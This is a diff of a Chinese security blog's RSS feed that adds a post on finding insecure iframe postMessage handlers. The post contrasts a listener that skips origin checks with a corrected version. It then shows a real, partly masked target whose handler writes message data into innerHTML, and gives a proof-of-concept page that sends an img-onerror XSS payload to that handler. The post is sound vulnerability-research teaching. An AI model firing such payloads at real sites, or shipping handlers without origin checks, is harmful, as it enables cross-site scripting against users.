@@ -1,4 +1,100 @@
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on 青鸟的博客</title><link>https://blue-bird1.github.io/posts/</link><description>Recent content in Posts on 青鸟的博客</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Fri, 31 Dec 2021 13:29:59 +0800</lastBuildDate><atom:link href="https://blue-bird1.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>2021年度总结</title><link>https://blue-bird1.github.io/posts/2021end/</link><pubDate>Fri, 31 Dec 2021 13:29:59 +0800</pubDate><guid>https://blue-bird1.github.io/posts/2021end/</guid><description>2021年度总结 如果用一个成语形容自己的2021年 就是混吃等死 去年目标回顾 首先看看去年的目标吧 挖几个CVE 博客每月更新一篇 学一些大学基础学科</description><content type="html"><![CDATA[
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on 青鸟的博客</title><link>https://blue-bird1.github.io/posts/</link><description>Recent content in Posts on 青鸟的博客</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Sun, 12 Jun 2022 14:45:47 +0800</lastBuildDate><atom:link href="https://blue-bird1.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>挖掘iframe通信安全漏洞</title><link>https://blue-bird1.github.io/posts/iframesec/</link><pubDate>Sun, 12 Jun 2022 14:45:47 +0800</pubDate><guid>https://blue-bird1.github.io/posts/iframesec/</guid><description>挖掘iframe通信安全漏洞 原理 跨域通信一般是直接ajax,用限定请求域名的方法来保证安全.但是也具有其中的局限性,只能读取服务器数据.而不</description><content type="html"><![CDATA[
+
+<h2 id="挖掘iframe通信安全漏洞">挖掘iframe通信安全漏洞</h2>
+
+<h3 id="原理">原理</h3>
+
+<p>跨域通信一般是直接ajax,用限定请求域名的方法来保证安全.但是也具有其中的局限性,只能读取服务器数据.而不能读取本地的localStorage数据等.</p>
+
+<p>如果需要本地数据,依然需要iframe,现在iframe通信采用的是<code>postmessage</code>的形式</p>
+
+<p>一个简单的例子就是</p>
+
+<pre><code> window.addEventListener(&quot;message&quot;, (function(e) {
+                console.log(&quot;[evt]&quot;, e.data),
+                
+ }
+ 
+ window.parent.postMessage({
+                            scrollHeight: t,
+                            pageHight: t,
+                            orange: e.warnSensitive,
+                            red: e.dangerSensitive
+ }, &quot;*&quot;)
+ 
+</code></pre>
+
+<p>以上实际上是很不安全的例子,因为<code>postmessage</code>没有浏览器的跨域保护, 接收的数据可能来源于任何一个域名.</p>
+
+<p>正确的写法应该是</p>
+
+<pre><code> window.addEventListener(&quot;message&quot;, (function(e) {
+   if (e.origin !== &quot;http://example.com&quot;)
+    return;
+    }
+   console.log(&quot;[evt]&quot;, e.data),
+                e.data.cvid &amp;&amp; (e.data.text || e.data.newHtml) &amp;&amp;      t.setContent(e.data)
+ }
+</code></pre>
+
+<h3 id="实战">实战</h3>
+
+<p><img src="/images/image-20220612144739249.png" alt="image-20220612144739249" /></p>
+
+<p>在浏览器f12就能直接看到iframe的载入. 当然iframe也可能是单纯用于展示,没有<code>postmessage</code>的通信.</p>
+
+<p>不过可以在浏览器点击<code>global listeners</code> 然后看有没有<code>message</code>的事件监听者</p>
+
+<p><img src="/images/image-20220612150032455.png" alt="image-20220612150032455" /></p>
+
+<p>可以看到其中有两个,其中有一个是框架生成的,另一个才是程序员自己写的.框架那个做了验证,</p>
+
+<p>蓝色的链接也能直接点到达代码位置</p>
+
+<p>代码大致如下</p>
+
+<pre><code>
+ window.addEventListener(&quot;message&quot;, (function(e) {
+                var t = this;
+                console.log(&quot;[evt]&quot;, e.data),
+                e.data.cvid &amp;&amp; (e.data.text || e.data.newHtml) &amp;&amp; t.setContent(e.data)
+  }
+  
+  setContent: function(t) {
+                if (t.newHtml) {
+                    var n = function() {
+                        var t = arguments.length &amp;gt; 0 &amp;&amp; void 0 !== arguments[0] ? arguments[0] : &quot;&quot;
+                          , e = arguments.length &amp;gt; 1 &amp;&amp; void 0 !== arguments[1] ? arguments[1] : []
+                          , n = arguments.length &amp;gt; 2 &amp;&amp; void 0 !== arguments[2] ? arguments[2] : []
+                          , i = h(t, e)
+                          , o = h(i.content, n)
+                          , a = document.createElement(&quot;div&quot;)
+                        a.innerHTML = o.content,
+// 省略
+
+</code></pre>
+
+<p>直接传入了<code>innerhtml</code> ,从代码的取值可以构造出以下exp</p>
+
+<pre><code>&lt;iframe width=&quot;800&quot; height=&quot;800&quot; id=&quot;bilibili&quot; style=&quot;display:none&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;
+const iframe = document.getElementById(&quot;bilibili&quot;)
+iframe.setAttribute(&quot;src&quot;, &quot;https://www.***.com/h5/note-app/review&quot;);
+iframe.addEventListener(&quot;load&quot;, () =&gt; {
+iframe.contentWindow.postMessage(
+                    {
+                        newHtml:&quot;&lt;img onerror='console.log(1)' src='x' &gt;&quot;,
+                        cvid:1,
+                    },&quot;*&quot;
+);
+})
+&lt;/script&gt;
+</code></pre>
+
+<h3 id="总结">总结</h3>
+
+<p>原理和挖掘是不难的, 主要依赖于程序员忘记对iframe验证的错觉. 危害评估最高也就csrf和xss的级别,依赖于被攻击者进入你的网站.</p>
+]]></content></item><item><title>2021年度总结</title><link>https://blue-bird1.github.io/posts/2021end/</link><pubDate>Fri, 31 Dec 2021 13:29:59 +0800</pubDate><guid>https://blue-bird1.github.io/posts/2021end/</guid><description>2021年度总结 如果用一个成语形容自己的2021年 就是混吃等死 去年目标回顾 首先看看去年的目标吧 挖几个CVE 博客每月更新一篇 学一些大学基础学科</description><content type="html"><![CDATA[
 
 <h3 id="2021年度总结">2021年度总结</h3>
 
